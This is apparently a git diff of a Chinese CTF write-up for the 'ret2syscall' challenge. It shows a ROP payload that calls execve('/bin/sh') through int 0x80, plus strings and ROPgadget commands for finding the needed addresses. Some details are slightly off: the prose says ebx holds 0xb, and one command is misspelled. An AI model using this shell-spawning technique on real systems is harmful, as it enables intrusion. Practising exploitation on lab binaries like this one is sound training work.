@@ -69,12 +69,35 @@ checksec ret2syscall
 
 ida打开程序，发现没有system函数，因为是静态编译又不能调用libc中的函数，考虑一下int 0x80[系统调用](https://syscalls.kernelgrok.com)
 
-```
+```python
 payload = flat(
     ['A' * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])
 ```
 
 payload中，ebx=0xb对应系统调用表中的sys_execve，edx、ecx为0即可，ebx存/bin/sh的字符串地址
+
+/bin/sh字符串地址
+
+```
+strings -a -tx ret2syscall | grep '/bin/sh' + 0x8048000
+
+0x76408 + 0x8048000 = 0x80be408
+
+```
+
+int 0x80地址
+
+```
+ROPgadget --binary ret2syscall --only 'int'
+
+或者
+
+ROPgadge –binary ret2syscall –opcode cd80c3
+```
+
+
+
+
 
 
 
@@ -98,7 +121,7 @@ sh.interactive()
 
 
 
-xxx.c
+ret2syscall.c
 
 ```c
 #include <stdio.h>
